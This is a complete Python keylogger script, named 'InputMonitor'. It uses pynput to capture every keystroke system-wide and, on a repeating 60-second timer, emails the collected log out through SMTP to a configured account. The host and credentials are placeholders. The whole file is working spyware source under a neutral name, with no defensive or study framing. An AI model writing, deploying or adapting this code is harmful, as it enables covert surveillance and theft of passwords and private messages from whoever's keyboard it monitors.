#!/usr/bin/env python

import smtplib
import threading
from pynput import keyboard

class InputMonitor:

    def __init__(self, interval, email, password, smtp_server, smtp_port):
        self.interval = interval  # Interval in seconds
        self.log = "Input monitoring initiated..."
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

    def add_to_log(self, string):
        self.log += string

    def on_key_press(self, key):
        try:
            key_pressed = str(key.char)
        except AttributeError:
            if key == key.space:
                key_pressed = " "
            elif key == key.esc:
                print("Program terminated...")
                return False
            else:
                key_pressed = " " + str(key) + " "

        self.add_to_log(key_pressed)

    def send_email(self, email, password, message):
        with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)

    def generate_report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.generate_report)
        timer.start()

    def start(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            self.generate_report()
            listener.join()

if __name__ == "__main__":
    # Set the interval to 60 seconds (1 minute), using the provided email and password
    monitor = InputMonitor(
        interval=60,
        email='your-email@example.com',
        password='your-password',
        smtp_server='smtp.example.com',
        smtp_port=587
    )
    monitor.start()
